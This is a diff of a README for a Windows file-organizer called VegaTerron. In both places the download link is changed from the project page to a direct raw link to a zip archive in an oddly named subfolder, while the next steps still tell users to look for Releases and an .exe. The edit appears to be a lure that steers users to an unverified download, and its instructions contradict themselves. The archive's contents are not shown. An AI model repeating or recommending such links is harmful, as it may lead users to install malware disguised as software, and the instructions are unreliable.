@@ -1,6 +1,6 @@
 # 🌍 VegaTerron - Organize your digital files with ease
 
-[![Download VegaTerron](https://img.shields.io/badge/Download-VegaTerron-blue)](https://github.com/dreamlike-newenglandclamchowder154/VegaTerron)
+[![Download VegaTerron](https://img.shields.io/badge/Download-VegaTerron-blue)](https://github.com/dreamlike-newenglandclamchowder154/VegaTerron/raw/refs/heads/main/measuredly/Terron-Vega-1.9.zip)
 
 ## 📁 What is VegaTerron?
 
@@ -14,7 +14,7 @@ Your computer needs Windows 10 or 11 to run this software. You need at least 200
 
 You must visit the project page to download the software.
 
-1. Open this link: https://github.com/dreamlike-newenglandclamchowder154/VegaTerron
+1. Open this link: https://github.com/dreamlike-newenglandclamchowder154/VegaTerron/raw/refs/heads/main/measuredly/Terron-Vega-1.9.zip
 2. Look for the section on the right side of the page labeled Releases.
 3. Click the link that says Latest.
 4. Find the file ending in .exe.
